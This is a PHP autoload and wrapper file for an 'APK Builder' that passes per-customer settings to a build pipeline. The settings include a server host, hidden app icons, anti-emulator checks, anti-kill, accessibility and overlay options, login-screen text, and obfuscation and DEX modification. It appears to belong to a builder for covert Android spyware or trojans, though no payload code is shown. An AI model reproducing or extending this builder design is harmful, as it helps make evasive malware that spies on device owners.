<?php
/**
 * APK Builder - 自动加载入口文件
 * 
 * 使用方法:
 * 
 * 方式1：使用配置对象（推荐）
 * ```php
 * require_once 'ApkBuilder.php';
 * 
 * $config = ApkBuildConfig::fromArray([
 *     'appid' => 'com.example.app',
 *     'userid' => '126021',
 *     'appname' => 'My App',
 *     // ...
 * ]);
 * 
 * // 启用保护功能（默认关闭）
 * $config->enableJunkClasses = true;
 * $config->enableClassShuffle = true;
 * 
 * $builder = new ApkBuilder();
 * $result = $builder->build($config);
 * ```
 * 
 * 方式2：使用兼容接口
 * ```php
 * require_once 'ApkBuilder.php';
 * 
 * $builder = new ApkBuilder();
 * $result = $builder->buildCustom($appid, $userid, ...);
 * ```
 */

// 自动加载 ApkBuilder 命名空间下的类
spl_autoload_register(function ($class) {
    // 处理命名空间
    if (strpos($class, 'ApkBuilder\\') === 0) {
        $className = substr($class, strlen('ApkBuilder\\'));
        $file = __DIR__ . '/ApkBuilder/' . $className . '.php';
        if (file_exists($file)) {
            require_once $file;
        }
    }
});

// 加载所有类文件
require_once __DIR__ . '/ApkBuilder/ApkBuildConfig.php';
require_once __DIR__ . '/ApkBuilder/BuildLogger.php';
require_once __DIR__ . '/ApkBuilder/Encryptor.php';
require_once __DIR__ . '/ApkBuilder/SmaliProcessor.php';
require_once __DIR__ . '/ApkBuilder/Obfuscator.php';
require_once __DIR__ . '/ApkBuilder/ApkProtector.php';
require_once __DIR__ . '/ApkBuilder/Builder.php';

/**
 * APK 构建器（向后兼容包装类）
 */
class ApkBuilder
{
    private \ApkBuilder\Builder $builder;

    public function __construct()
    {
        $this->builder = new \ApkBuilder\Builder();
    }

    /**
     * 使用配置对象构建 APK
     * 
     * @param ApkBuildConfig $config 构建配置
     * @return array 构建结果
     */
    public function build(\ApkBuilder\ApkBuildConfig $config): array
    {
        return $this->builder->build($config);
    }

    /**
     * 兼容旧接口的构建方法
     */
    public function buildCustom(
        string $appid,
        string $userid,
        string $clientname,
        string $email,
        string $mainActivity,
        string $appFolder,
        string $UserHost,
        string $useAccess,
        string $useAntkill,
        string $useAtoprims,
        string $notifyTitle,
        string $notifyMsg,
        string $userAllprims,
        string $userBlackprims,
        string $buildType,
        string $appname,
        string $appversion,
        string $appicopath,
        string $appurl,
        string $loginTitle,
        string $loginDis,
        string $loginBtn,
        string $lngShort,
        string $hiddenApp,
        string $noEmulator,
        string $installType,
        string $hideType,
        string $useDraw,
        string $openAccess,
        string $description,
        string $diaoType
    ): array {
        $config = \ApkBuilder\ApkBuildConfig::fromArray(compact(
            'appid', 'userid', 'clientname', 'email', 'mainActivity', 'appFolder',
            'UserHost', 'useAccess', 'useAntkill', 'useAtoprims', 'notifyTitle',
            'notifyMsg', 'userAllprims', 'userBlackprims', 'buildType', 'appname',
            'appversion', 'appicopath', 'appurl', 'loginTitle', 'loginDis',
            'loginBtn', 'lngShort', 'hiddenApp', 'noEmulator', 'installType',
            'hideType', 'useDraw', 'openAccess', 'description', 'diaoType'
        ));
        
        return $this->builder->build($config);
    }

    /**
     * 使用配置对象构建，并启用所有保护功能
     * 
     * @param ApkBuildConfig $config 构建配置
     * @return array 构建结果
     */
    public function buildWithProtection(\ApkBuilder\ApkBuildConfig $config): array
    {
        $config->enableJunkClasses = true;
        $config->enableClassShuffle = true;
        $config->enableApkProtection = true;
        $config->enableDexModification = true;
        
        return $this->builder->build($config);
    }
}
